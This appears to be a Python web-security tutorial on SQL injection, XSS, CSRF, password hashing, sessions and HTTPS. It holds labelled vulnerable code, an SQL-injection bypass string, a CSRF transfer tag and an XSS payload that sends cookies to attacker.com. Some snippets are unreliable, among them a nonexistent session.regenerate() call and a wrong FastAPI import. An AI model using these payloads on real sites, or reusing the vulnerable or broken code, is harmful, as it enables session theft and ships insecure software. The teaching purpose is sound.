# Security Basics in Python Web Applications

## Table of Contents
1. [Introduction to Web Security](#introduction-to-web-security)
2. [OWASP Top 10](#owasp-top-10)
3. [SQL Injection Prevention](#sql-injection-prevention)
4. [Cross-Site Scripting (XSS) Prevention](#cross-site-scripting-xss-prevention)
5. [Cross-Site Request Forgery (CSRF) Protection](#cross-site-request-forgery-csrf-protection)
6. [Secure Password Storage](#secure-password-storage)
7. [Authentication and Session Management](#authentication-and-session-management)
8. [HTTPS and SSL/TLS](#https-and-ssltls)
9. [Security Headers](#security-headers)
10. [Input Validation and Sanitization](#input-validation-and-sanitization)
11. [File Upload Security](#file-upload-security)
12. [API Security](#api-security)
13. [Dependency Management](#dependency-management)
14. [Security Testing](#security-testing)
15. [Best Practices](#best-practices)

---

## Introduction to Web Security

### Why Web Security Matters

```python
"""
Consequences of Poor Security:

1. Data Breaches
   - Stolen user credentials
   - Exposed personal information
   - Financial losses

2. Business Impact
   - Loss of customer trust
   - Legal liability
   - Regulatory fines (GDPR, CCPA)
   - Reputation damage

3. Technical Damage
   - System compromise
   - Service downtime
   - Data corruption
   - Resource theft (cryptomining)

4. Legal Consequences
   - Lawsuits
   - Compliance violations
   - Criminal charges
"""
```

### Security Principles

```python
"""
Core Security Principles:

1. Defense in Depth
   - Multiple layers of security
   - No single point of failure

2. Least Privilege
   - Minimal necessary permissions
   - Restrict access by default

3. Fail Securely
   - Default deny
   - Secure error handling

4. Don't Trust User Input
   - Validate everything
   - Sanitize all inputs

5. Keep Security Simple
   - Complexity is the enemy of security
   - Use proven solutions

6. Security by Design
   - Build security in from the start
   - Not an afterthought
"""
```

---

## OWASP Top 10

### OWASP Top 10 (2021)

```python
"""
1. Broken Access Control
   - Users can access unauthorized resources
   
2. Cryptographic Failures
   - Weak encryption, exposed sensitive data
   
3. Injection
   - SQL, NoSQL, OS command injection
   
4. Insecure Design
   - Missing or ineffective security controls
   
5. Security Misconfiguration
   - Default configs, verbose errors
   
6. Vulnerable and Outdated Components
   - Using libraries with known vulnerabilities
   
7. Identification and Authentication Failures
   - Weak authentication, session management
   
8. Software and Data Integrity Failures
   - Unsigned updates, insecure CI/CD
   
9. Security Logging and Monitoring Failures
   - Insufficient logging, delayed detection
   
10. Server-Side Request Forgery (SSRF)
    - App fetches remote resource without validation
"""
```

---

## SQL Injection Prevention

### What is SQL Injection?

```python
"""
SQL Injection occurs when an attacker can insert malicious SQL code
into a query, potentially gaining unauthorized access to data or
executing arbitrary commands.

Example Attack:
username: admin' OR '1'='1
password: anything

Query becomes:
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'

This always returns true, bypassing authentication.
"""
```

### Vulnerable Code (DON'T DO THIS)

```python
import sqlite3

# ❌ VULNERABLE CODE - Never do this!
def vulnerable_login(username, password):
    """INSECURE: Direct string formatting."""
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # This is vulnerable to SQL injection!
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)
    
    user = cursor.fetchone()
    conn.close()
    
    return user is not None

# ❌ Also vulnerable
def vulnerable_search(search_term):
    """INSECURE: String concatenation."""
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # Still vulnerable!
    query = "SELECT * FROM products WHERE name LIKE '%" + search_term + "%'"
    cursor.execute(query)
    
    return cursor.fetchall()
```

### Secure Code with Parameterized Queries

```python
import sqlite3
from typing import Optional, List, Tuple

# ✅ SECURE: Parameterized queries
def secure_login(username: str, password: str) -> Optional[Tuple]:
    """SECURE: Using parameterized queries."""
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # Use ? placeholders
    query = "SELECT * FROM users WHERE username=? AND password=?"
    cursor.execute(query, (username, password))
    
    user = cursor.fetchone()
    conn.close()
    
    return user

# ✅ SECURE: Named parameters
def secure_search(search_term: str) -> List[Tuple]:
    """SECURE: Named parameters."""
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # Use named placeholders
    query = "SELECT * FROM products WHERE name LIKE :search"
    cursor.execute(query, {'search': f'%{search_term}%'})
    
    return cursor.fetchall()

# ✅ SECURE: With multiple parameters
def get_user_orders(user_id: int, status: str, limit: int = 10) -> List[Tuple]:
    """SECURE: Multiple parameters."""
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    query = """
        SELECT * FROM orders 
        WHERE user_id=? AND status=? 
        ORDER BY created_at DESC 
        LIMIT ?
    """
    cursor.execute(query, (user_id, status, limit))
    
    return cursor.fetchall()
```

### SQLAlchemy ORM (Automatic Protection)

```python
from sqlalchemy import create_engine, Column, Integer, String
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

Base = declarative_base()

class User(Base):
    __tablename__ = 'users'
    
    id = Column(Integer, primary_key=True)
    username = Column(String(50), unique=True)
    email = Column(String(100))
    password_hash = Column(String(255))

engine = create_engine('sqlite:///database.db')
Session = sessionmaker(bind=engine)

# ✅ SECURE: ORM automatically uses parameterized queries
def secure_orm_login(username: str, password_hash: str) -> Optional[User]:
    """SECURE: ORM prevents SQL injection."""
    session = Session()
    
    # SQLAlchemy automatically parameterizes this
    user = session.query(User).filter(
        User.username == username,
        User.password_hash == password_hash
    ).first()
    
    session.close()
    return user

# ✅ SECURE: Complex queries
def secure_orm_search(search_term: str) -> List[User]:
    """SECURE: ORM search."""
    session = Session()
    
    # SQLAlchemy handles parameterization
    users = session.query(User).filter(
        User.username.like(f'%{search_term}%')
    ).all()
    
    session.close()
    return users
```

### Django ORM (Built-in Protection)

```python
from django.db import models

class User(models.Model):
    username = models.CharField(max_length=50, unique=True)
    email = models.EmailField()
    password_hash = models.CharField(max_length=255)

# ✅ SECURE: Django ORM prevents SQL injection
def django_secure_login(username, password_hash):
    """SECURE: Django ORM."""
    try:
        # Django automatically parameterizes queries
        user = User.objects.get(
            username=username,
            password_hash=password_hash
        )
        return user
    except User.DoesNotExist:
        return None

# ✅ SECURE: Complex filtering
def django_secure_search(search_term):
    """SECURE: Django search."""
    # Django handles SQL injection prevention
    users = User.objects.filter(username__icontains=search_term)
    return users

# ⚠️ CAREFUL: Raw SQL in Django
from django.db import connection

def django_raw_sql_secure(user_id):
    """Use raw SQL carefully with proper parameterization."""
    with connection.cursor() as cursor:
        # ✅ CORRECT: Parameterized
        cursor.execute("SELECT * FROM app_user WHERE id=%s", [user_id])
        
        # ❌ WRONG: String formatting
        # cursor.execute(f"SELECT * FROM app_user WHERE id={user_id}")
        
        return cursor.fetchall()
```

---

## Cross-Site Scripting (XSS) Prevention

### What is XSS?

```python
"""
Cross-Site Scripting (XSS) allows attackers to inject malicious scripts
into web pages viewed by other users.

Types of XSS:
1. Stored XSS: Malicious script stored in database
2. Reflected XSS: Script reflected from request (URL parameters)
3. DOM-based XSS: Script executed via DOM manipulation

Example Attack:
Comment: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

When rendered without escaping, this steals the user's session cookie.
"""
```

### Vulnerable Code (DON'T DO THIS)

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

# ❌ VULNERABLE: No output escaping
@app.route('/search')
def vulnerable_search():
    """INSECURE: Direct output of user input."""
    query = request.args.get('q', '')
    
    # Dangerous! User input rendered directly
    html = f"""
    <html>
        <body>
            <h1>Search Results for: {query}</h1>
            <p>No results found.</p>
        </body>
    </html>
    """
    return html

# ❌ VULNERABLE: Unsafe template rendering
@app.route('/comment')
def vulnerable_comment():
    """INSECURE: Template without escaping."""
    comment = request.args.get('text', '')
    
    # Using |safe disables escaping - dangerous!
    return render_template_string("""
        <div class="comment">{{ comment|safe }}</div>
    """, comment=comment)
```

### Secure Code with Proper Escaping

```python
from flask import Flask, request, render_template, escape
from markupsafe import Markup
import html

app = Flask(__name__)

# ✅ SECURE: Automatic escaping with templates
@app.route('/search')
def secure_search():
    """SECURE: Jinja2 templates automatically escape."""
    query = request.args.get('q', '')
    
    # Jinja2 automatically escapes {{ query }}
    return render_template('search.html', query=query)

# ✅ SECURE: Manual escaping
@app.route('/comment')
def secure_comment():
    """SECURE: Manual HTML escaping."""
    comment = request.args.get('text', '')
    
    # Manually escape dangerous characters
    safe_comment = html.escape(comment)
    
    return f"""
    <html>
        <body>
            <div class="comment">{safe_comment}</div>
        </body>
    </html>
    """

# ✅ SECURE: Using Flask's escape
@app.route('/user/<username>')
def secure_user_profile(username):
    """SECURE: Using Flask's escape function."""
    # Escape user input
    safe_username = escape(username)
    
    return f"<h1>Profile: {safe_username}</h1>"

# ✅ SECURE: Allowing limited HTML with sanitization
from bleach import clean

@app.route('/post')
def secure_post():
    """SECURE: Sanitize HTML, allow specific tags only."""
    content = request.args.get('content', '')
    
    # Allow only safe tags and attributes
    allowed_tags = ['p', 'br', 'strong', 'em', 'a']
    allowed_attrs = {'a': ['href', 'title']}
    
    safe_content = clean(
        content,
        tags=allowed_tags,
        attributes=allowed_attrs,
        strip=True
    )
    
    return render_template('post.html', content=Markup(safe_content))
```

### Jinja2 Template Security

```html
<!-- templates/search.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Search Results</title>
</head>
<body>
    <!-- ✅ SECURE: Automatic escaping -->
    <h1>Search Results for: {{ query }}</h1>
    
    <!-- ✅ SECURE: Escaping in attributes -->
    <input type="text" value="{{ query }}" name="q">
    
    <!-- ❌ DANGEROUS: Disabled escaping -->
    <!-- <div>{{ query|safe }}</div> -->
    
    <!-- ✅ SECURE: Escaping in JavaScript -->
    <script>
        // Use JSON serialization for JavaScript
        var searchQuery = {{ query|tojson }};
        console.log(searchQuery);
    </script>
    
    <!-- ✅ SECURE: URL escaping -->
    <a href="/results?q={{ query|urlencode }}">View All</a>
</body>
</html>
```

### FastAPI with Automatic Escaping

```python
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates
from fastapi.responses import HTMLResponse
import html

app = FastAPI()
templates = Jinja2Templates(directory="templates")

# ✅ SECURE: Jinja2 auto-escapes
@app.get("/search", response_class=HTMLResponse)
async def search(request: Request, q: str = ""):
    """SECURE: Templates automatically escape."""
    return templates.TemplateResponse(
        "search.html",
        {"request": request, "query": q}
    )

# ✅ SECURE: Manual response with escaping
@app.get("/comment")
async def comment(text: str = ""):
    """SECURE: Manual HTML escaping."""
    safe_text = html.escape(text)
    
    return HTMLResponse(f"""
        <html>
            <body>
                <div>{safe_text}</div>
            </body>
        </html>
    """)

# ✅ SECURE: Pydantic models validate input
from pydantic import BaseModel, validator

class Comment(BaseModel):
    text: str
    author: str
    
    @validator('text', 'author')
    def validate_no_scripts(cls, v):
        """Reject input containing script tags."""
        if '<script' in v.lower():
            raise ValueError('Script tags not allowed')
        return v

@app.post("/api/comments")
async def create_comment(comment: Comment):
    """SECURE: Input validation."""
    # Pydantic already validated the input
    return {"message": "Comment created", "comment": comment}
```

### Django Template Security

```python
# Django templates automatically escape by default

# views.py
from django.shortcuts import render
from django.utils.html import escape, format_html
from django.utils.safestring import mark_safe
import bleach

def search_view(request):
    """SECURE: Django templates auto-escape."""
    query = request.GET.get('q', '')
    
    # Template will automatically escape {{ query }}
    return render(request, 'search.html', {'query': query})

def comment_view(request):
    """SECURE: Manual escaping."""
    comment = request.GET.get('text', '')
    
    # Manual escaping
    safe_comment = escape(comment)
    
    # Or use format_html for formatted strings
    html_content = format_html(
        '<div class="comment">{}</div>',
        comment  # Automatically escaped
    )
    
    return render(request, 'comment.html', {'content': html_content})

def rich_content_view(request):
    """SECURE: Sanitize rich content."""
    content = request.POST.get('content', '')
    
    # Sanitize HTML
    allowed_tags = ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li']
    clean_content = bleach.clean(content, tags=allowed_tags, strip=True)
    
    # Mark as safe after sanitization
    safe_content = mark_safe(clean_content)
    
    return render(request, 'content.html', {'content': safe_content})
```

```html
<!-- Django template: search.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Search</title>
</head>
<body>
    <!-- ✅ SECURE: Auto-escaped -->
    <h1>Results for: {{ query }}</h1>
    
    <!-- ❌ DANGEROUS: Disabled escaping -->
    <!-- <div>{{ query|safe }}</div> -->
    
    <!-- ✅ SECURE: JSON for JavaScript -->
    <script>
        var query = {{ query|escapejs }};
    </script>
</body>
</html>
```

### Content Security Policy (CSP)

```python
from flask import Flask, make_response

app = Flask(__name__)

@app.after_request
def set_csp(response):
    """Set Content Security Policy header."""
    # Restrict where scripts can be loaded from
    csp = (
        "default-src 'self'; "
        "script-src 'self' https://cdn.example.com; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "font-src 'self'; "
        "connect-src 'self'; "
        "frame-ancestors 'none';"
    )
    
    response.headers['Content-Security-Policy'] = csp
    return response
```

---

## Cross-Site Request Forgery (CSRF) Protection

### What is CSRF?

```python
"""
Cross-Site Request Forgery (CSRF) tricks authenticated users into
executing unwanted actions.

Example Attack:
User is logged into bank.com
Attacker sends email with:
<img src="https://bank.com/transfer?to=attacker&amount=1000">

When user opens email, the browser automatically sends the request
with the user's session cookie, transferring money to the attacker.
"""
```

### Flask CSRF Protection

```python
from flask import Flask, render_template, request, session
from flask_wtf.csrf import CSRFProtect
import secrets

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(32)

# Enable CSRF protection
csrf = CSRFProtect(app)

# CSRF is now automatically required for all POST requests

@app.route('/transfer', methods=['GET', 'POST'])
def transfer():
    """SECURE: CSRF protection automatically applied."""
    if request.method == 'POST':
        # Flask-WTF automatically validates CSRF token
        to_account = request.form.get('to')
        amount = request.form.get('amount')
        
        # Process transfer
        return f"Transfer {amount} to {to_account}"
    
    return render_template('transfer.html')

# Exempt specific routes if needed (use carefully!)
@app.route('/webhook', methods=['POST'])
@csrf.exempt
def webhook():
    """Exempt from CSRF (for external webhooks)."""
    # Process webhook
    return {'status': 'ok'}
```

```html
<!-- templates/transfer.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Transfer Money</title>
</head>
<body>
    <form method="POST">
        <!-- ✅ REQUIRED: CSRF token -->
        {{ csrf_token() }}
        
        <label>To Account:</label>
        <input type="text" name="to" required>
        
        <label>Amount:</label>
        <input type="number" name="amount" required>
        
        <button type="submit">Transfer</button>
    </form>
</body>
</html>
```

### FastAPI CSRF Protection

```python
from fastapi import FastAPI, Request, Form, HTTPException, Depends
from fastapi.templating import Jinja2Templates
from fastapi.responses import HTMLResponse
from starlette.middleware.sessions import SessionMiddleware
import secrets

app = FastAPI()

# Add session middleware (required for CSRF)
app.add_middleware(SessionMiddleware, secret_key=secrets.token_hex(32))

templates = Jinja2Templates(directory="templates")

def generate_csrf_token(request: Request) -> str:
    """Generate CSRF token and store in session."""
    if 'csrf_token' not in request.session:
        request.session['csrf_token'] = secrets.token_urlsafe(32)
    return request.session['csrf_token']

def verify_csrf_token(request: Request, token: str = Form(...)):
    """Verify CSRF token."""
    session_token = request.session.get('csrf_token')
    
    if not session_token or session_token != token:
        raise HTTPException(status_code=403, detail="Invalid CSRF token")
    
    return True

@app.get("/transfer", response_class=HTMLResponse)
async def transfer_form(request: Request):
    """Display transfer form with CSRF token."""
    csrf_token = generate_csrf_token(request)
    
    return templates.TemplateResponse(
        "transfer.html",
        {"request": request, "csrf_token": csrf_token}
    )

@app.post("/transfer")
async def process_transfer(
    request: Request,
    to: str = Form(...),
    amount: float = Form(...),
    csrf_valid: bool = Depends(verify_csrf_token)
):
    """Process transfer with CSRF protection."""
    # Process the transfer
    return {"message": f"Transfer {amount} to {to}"}

# Alternative: Custom CSRF middleware
from fastapi.middleware.base import BaseHTTPMiddleware

class CSRFMiddleware(BaseHTTPMiddleware):
    """CSRF protection middleware."""
    
    async def dispatch(self, request: Request, call_next):
        # Check CSRF token for state-changing methods
        if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
            token = request.headers.get('X-CSRF-Token')
            session_token = request.session.get('csrf_token')
            
            if not token or token != session_token:
                raise HTTPException(status_code=403, detail="CSRF validation failed")
        
        response = await call_next(request)
        return response

# app.add_middleware(CSRFMiddleware)
```

### Django CSRF Protection

```python
# Django has built-in CSRF protection

# settings.py
MIDDLEWARE = [
    'django.middleware.csrf.CsrfViewMiddleware',  # CSRF middleware
    # ... other middleware
]

# views.py
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt, csrf_protect

def transfer_view(request):
    """SECURE: CSRF automatically protected."""
    if request.method == 'POST':
        # Django automatically validates CSRF token
        to_account = request.POST.get('to')
        amount = request.POST.get('amount')
        
        # Process transfer
        return render(request, 'success.html')
    
    return render(request, 'transfer.html')

# Exempt specific views if needed (use carefully!)
@csrf_exempt
def webhook_view(request):
    """Exempt from CSRF (for external webhooks)."""
    if request.method == 'POST':
        # Process webhook
        return JsonResponse({'status': 'ok'})
```

```html
<!-- Django template: transfer.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Transfer</title>
</head>
<body>
    <form method="POST">
        <!-- ✅ REQUIRED: CSRF token -->
        {% csrf_token %}
        
        <input type="text" name="to" placeholder="To Account" required>
        <input type="number" name="amount" placeholder="Amount" required>
        
        <button type="submit">Transfer</button>
    </form>
</body>
</html>
```

### AJAX CSRF Protection

```javascript
// JavaScript CSRF token handling

// Get CSRF token from cookie
function getCookie(name) {
    let cookieValue = null;
    if (document.cookie && document.cookie !== '') {
        const cookies = document.cookie.split(';');
        for (let i = 0; i < cookies.length; i++) {
            const cookie = cookies[i].trim();
            if (cookie.substring(0, name.length + 1) === (name + '=')) {
                cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                break;
            }
        }
    }
    return cookieValue;
}

const csrftoken = getCookie('csrftoken');

// Include CSRF token in AJAX requests
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRFToken': csrftoken
    },
    body: JSON.stringify({
        to: 'account123',
        amount: 100
    })
})
.then(response => response.json())
.then(data => console.log(data));
```

---

## Secure Password Storage

### Password Hashing Basics

```python
"""
NEVER store passwords in plain text!

Bad: password = "mysecret123"
Good: password_hash = "$2b$12$KIXzN..."

Requirements:
1. Use strong hashing algorithm (bcrypt, Argon2, PBKDF2)
2. Use salt (prevents rainbow table attacks)
3. Use sufficient work factor (slows down brute force)
4. Never decrypt passwords (one-way hashing only)
"""
```

### Using bcrypt

```python
import bcrypt

class PasswordManager:
    """Secure password hashing with bcrypt."""
    
    @staticmethod
    def hash_password(password: str) -> bytes:
        """
        Hash a password using bcrypt.
        
        Args:
            password: Plain text password
            
        Returns:
            Hashed password
        """
        # Generate salt and hash password
        # rounds=12 is a good balance (higher = slower but more secure)
        salt = bcrypt.gensalt(rounds=12)
        hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
        
        return hashed
    
    @staticmethod
    def verify_password(password: str, hashed: bytes) -> bool:
        """
        Verify a password against its hash.
        
        Args:
            password: Plain text password to verify
            hashed: Hashed password from database
            
        Returns:
            True if password matches, False otherwise
        """
        return bcrypt.checkpw(password.encode('utf-8'), hashed)

# Usage example
if __name__ == "__main__":
    pm = PasswordManager()
    
    # Hash password
    password = "SecurePassword123!"
    hashed = pm.hash_password(password)
    print(f"Hashed: {hashed}")
    
    # Verify correct password
    is_valid = pm.verify_password("SecurePassword123!", hashed)
    print(f"Correct password: {is_valid}")  # True
    
    # Verify incorrect password
    is_valid = pm.verify_password("WrongPassword", hashed)
    print(f"Wrong password: {is_valid}")  # False
```

### Using Argon2 (Recommended)

```python
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

class SecurePasswordManager:
    """
    Secure password hashing with Argon2.
    
    Argon2 won the Password Hashing Competition (2015)
    and is recommended for new applications.
    """
    
    def __init__(self):
        # Create password hasher with secure defaults
        self.ph = PasswordHasher(
            time_cost=2,        # Number of iterations
            memory_cost=65536,  # Memory usage in KiB
            parallelism=4,      # Number of parallel threads
            hash_len=32,        # Length of hash in bytes
            salt_len=16         # Length of salt in bytes
        )
    
    def hash_password(self, password: str) -> str:
        """Hash a password using Argon2."""
        return self.ph.hash(password)
    
    def verify_password(self, password: str, hashed: str) -> bool:
        """Verify a password against its hash."""
        try:
            self.ph.verify(hashed, password)
            
            # Check if rehashing is needed (parameters changed)
            if self.ph.check_needs_rehash(hashed):
                # In a real app, you would rehash and update the database
                print("Password should be rehashed with new parameters")
            
            return True
            
        except VerifyMismatchError:
            return False

# Usage
pm = SecurePasswordManager()

password = "MySecurePassword123!"
hashed = pm.hash_password(password)
print(f"Hashed: {hashed}")

# Verify
is_valid = pm.verify_password("MySecurePassword123!", hashed)
print(f"Valid: {is_valid}")  # True
```

### Password Strength Validation

```python
import re
from typing import List, Tuple

class PasswordValidator:
    """Validate password strength."""
    
    def __init__(
        self,
        min_length: int = 12,
        require_uppercase: bool = True,
        require_lowercase: bool = True,
        require_digits: bool = True,
        require_special: bool = True
    ):
        self.min_length = min_length
        self.require_uppercase = require_uppercase
        self.require_lowercase = require_lowercase
        self.require_digits = require_digits
        self.require_special = require_special
    
    def validate(self, password: str) -> Tuple[bool, List[str]]:
        """
        Validate password strength.
        
        Returns:
            Tuple of (is_valid, list of error messages)
        """
        errors = []
        
        # Check length
        if len(password) < self.min_length:
            errors.append(f"Password must be at least {self.min_length} characters")
        
        # Check uppercase
        if self.require_uppercase and not re.search(r'[A-Z]', password):
            errors.append("Password must contain at least one uppercase letter")
        
        # Check lowercase
        if self.require_lowercase and not re.search(r'[a-z]', password):
            errors.append("Password must contain at least one lowercase letter")
        
        # Check digits
        if self.require_digits and not re.search(r'\d', password):
            errors.append("Password must contain at least one digit")
        
        # Check special characters
        if self.require_special and not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
            errors.append("Password must contain at least one special character")
        
        # Check for common passwords
        if self.is_common_password(password):
            errors.append("Password is too common")
        
        return len(errors) == 0, errors
    
    def is_common_password(self, password: str) -> bool:
        """Check against list of common passwords."""
        # In production, check against a comprehensive list
        common_passwords = {
            'password', 'password123', '12345678', 'qwerty',
            'abc123', 'monkey', '1234567', 'letmein',
            'trustno1', 'dragon', 'baseball', 'iloveyou'
        }
        
        return password.lower() in common_passwords

# Usage
validator = PasswordValidator()

# Weak password
is_valid, errors = validator.validate("password")
print(f"Valid: {is_valid}")
print(f"Errors: {errors}")

# Strong password
is_valid, errors = validator.validate("MyS3cur3P@ssw0rd!")
print(f"Valid: {is_valid}")
print(f"Errors: {errors}")
```

### Complete User Registration Example

```python
from flask import Flask, request, jsonify
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError
import sqlite3
import secrets

app = Flask(__name__)
ph = PasswordHasher()
validator = PasswordValidator()

def get_db():
    """Get database connection."""
    conn = sqlite3.connect('users.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    """Initialize database."""
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            email TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()

@app.route('/register', methods=['POST'])
def register():
    """Register new user with secure password storage."""
    data = request.get_json()
    
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')
    
    # Validate input
    if not all([username, email, password]):
        return jsonify({'error': 'All fields required'}), 400
    
    # Validate password strength
    is_valid, errors = validator.validate(password)
    if not is_valid:
        return jsonify({'error': 'Weak password', 'details': errors}), 400
    
    # Hash password
    password_hash = ph.hash(password)
    
    # Save to database
    try:
        conn = get_db()
        conn.execute(
            "INSERT INTO users (username, email, password_hash) VALUES (?, ?, ?)",
            (username, email, password_hash)
        )
        conn.commit()
        conn.close()
        
        return jsonify({'message': 'User registered successfully'}), 201
        
    except sqlite3.IntegrityError:
        return jsonify({'error': 'Username or email already exists'}), 409

@app.route('/login', methods=['POST'])
def login():
    """Login with secure password verification."""
    data = request.get_json()
    
    username = data.get('username')
    password = data.get('password')
    
    if not all([username, password]):
        return jsonify({'error': 'All fields required'}), 400
    
    # Get user from database
    conn = get_db()
    user = conn.execute(
        "SELECT * FROM users WHERE username=?",
        (username,)
    ).fetchone()
    conn.close()
    
    if not user:
        # Use generic error message (don't reveal if user exists)
        return jsonify({'error': 'Invalid credentials'}), 401
    
    # Verify password
    try:
        ph.verify(user['password_hash'], password)
        
        # Check if rehashing needed
        if ph.check_needs_rehash(user['password_hash']):
            # Rehash with new parameters
            new_hash = ph.hash(password)
            conn = get_db()
            conn.execute(
                "UPDATE users SET password_hash=? WHERE id=?",
                (new_hash, user['id'])
            )
            conn.commit()
            conn.close()
        
        # Generate session token
        session_token = secrets.token_urlsafe(32)
        
        return jsonify({
            'message': 'Login successful',
            'token': session_token
        }), 200
        
    except VerifyMismatchError:
        return jsonify({'error': 'Invalid credentials'}), 401

if __name__ == '__main__':
    init_db()
    app.run(debug=True)
```

---

## Authentication and Session Management

### Secure Session Management

```python
from flask import Flask, session, request, jsonify
import secrets
from datetime import timedelta

app = Flask(__name__)

# ✅ SECURE: Strong secret key
app.config['SECRET_KEY'] = secrets.token_hex(32)

# ✅ SECURE: Session configuration
app.config['SESSION_COOKIE_SECURE'] = True      # HTTPS only
app.config['SESSION_COOKIE_HTTPONLY'] = True    # No JavaScript access
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'   # CSRF protection
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=2)

@app.route('/login', methods=['POST'])
def login():
    """Secure login with session management."""
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    # Verify credentials (using secure password verification)
    user = verify_user(username, password)
    
    if user:
        # ✅ SECURE: Regenerate session ID after login
        session.regenerate()
        
        # Store minimal information in session
        session['user_id'] = user['id']
        session['username'] = user['username']
        session.permanent = True
        
        return jsonify({'message': 'Login successful'}), 200
    
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/logout')
def logout():
    """Secure logout."""
    # ✅ SECURE: Clear session completely
    session.clear()
    
    return jsonify({'message': 'Logged out successfully'}), 200

def require_auth(f):
    """Decorator to require authentication."""
    from functools import wraps
    
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({'error': 'Authentication required'}), 401
        return f(*args, **kwargs)
    
    return decorated_function

@app.route('/protected')
@require_auth
def protected():
    """Protected route requiring authentication."""
    return jsonify({
        'message': f'Hello {session["username"]}',
        'user_id': session['user_id']
    })
```

### JWT Token Authentication

```python
from datetime import datetime, timedelta
import jwt
from functools import wraps
from flask import Flask, request, jsonify

app = Flask(__name__)
SECRET_KEY = secrets.token_hex(32)

def create_token(user_id: int, username: str) -> str:
    """Create JWT access token."""
    payload = {
        'user_id': user_id,
        'username': username,
        'exp': datetime.utcnow() + timedelta(hours=24),
        'iat': datetime.utcnow()
    }
    
    token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')
    return token

def verify_token(token: str) -> dict:
    """Verify JWT token."""
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        return payload
    except jwt.ExpiredSignatureError:
        raise Exception('Token has expired')
    except jwt.InvalidTokenError:
        raise Exception('Invalid token')

def token_required(f):
    """Decorator to require valid JWT token."""
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        
        if not token:
            return jsonify({'error': 'Token missing'}), 401
        
        try:
            # Remove 'Bearer ' prefix
            if token.startswith('Bearer '):
                token = token[7:]
            
            payload = verify_token(token)
            request.current_user = payload
            
        except Exception as e:
            return jsonify({'error': str(e)}), 401
        
        return f(*args, **kwargs)
    
    return decorated

@app.route('/api/login', methods=['POST'])
def api_login():
    """Login and receive JWT token."""
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    user = verify_user(username, password)
    
    if user:
        token = create_token(user['id'], user['username'])
        
        return jsonify({
            'token': token,
            'user': {
                'id': user['id'],
                'username': user['username']
            }
        }), 200
    
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/protected')
@token_required
def api_protected():
    """Protected API endpoint."""
    return jsonify({
        'message': f'Hello {request.current_user["username"]}',
        'user_id': request.current_user['user_id']
    })
```

---

## HTTPS and SSL/TLS

### Why HTTPS is Essential

```python
"""
HTTPS encrypts communication between client and server.

Without HTTPS:
- Passwords transmitted in plain text
- Session cookies can be stolen
- Man-in-the-middle attacks possible
- Data can be modified in transit

With HTTPS:
✅ Encrypted communication
✅ Authentication of server
✅ Data integrity
✅ Required for modern features (geolocation, camera, etc.)
"""
```

### Forcing HTTPS in Flask

```python
from flask import Flask, redirect, request

app = Flask(__name__)

@app.before_request
def force_https():
    """Redirect HTTP to HTTPS."""
    if not request.is_secure and not app.debug:
        url = request.url.replace('http://', 'https://', 1)
        return redirect(url, code=301)

# Alternative: Use Flask-Talisman
from flask_talisman import Talisman

app = Flask(__name__)

# Force HTTPS and set security headers
Talisman(
    app,
    force_https=True,
    strict_transport_security=True,
    strict_transport_security_max_age=31536000,
    content_security_policy={
        'default-src': "'self'",
        'script-src': ["'self'", "'unsafe-inline'"],
        'style-src': ["'self'", "'unsafe-inline'"]
    }
)
```

### Forcing HTTPS in FastAPI

```python
from fastapi import FastAPI, Request
from fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware

app = FastAPI()

# Redirect HTTP to HTTPS
app.add_middleware(HTTPSRedirectMiddleware)

# Alternative: Custom middleware
from fastapi.middleware.base import BaseHTTPMiddleware
from fastapi.responses import RedirectResponse

class HTTPSRedirect(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        if request.url.scheme != "https":
            url = request.url.replace(scheme="https")
            return RedirectResponse(url, status_code=301)
        return await call_next(request)

# app.add_middleware(HTTPSRedirect)
```

### Setting Up SSL/TLS

```python
# Production: Use reverse proxy (Nginx, Apache)
# Let's Encrypt for free SSL certificates

